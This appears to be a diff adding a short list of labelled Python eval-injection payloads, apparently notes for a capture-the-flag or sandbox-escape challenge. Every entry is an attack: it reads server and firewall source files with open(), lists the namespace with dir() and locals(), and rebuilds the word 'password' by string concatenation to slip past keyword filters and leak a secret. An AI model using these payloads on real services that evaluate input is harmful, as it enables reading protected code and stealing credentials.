@@ -1,0 +1,1 @@
+﻿#open server code@open("Gserver.py", "r").read()!#dir@dir()!eval("pass" + "word")!#open firewall@open("sec.py", 'r').read()!#smart eval@dir()!eval(dir()[1])!#locals@list(locals().values())[0]!
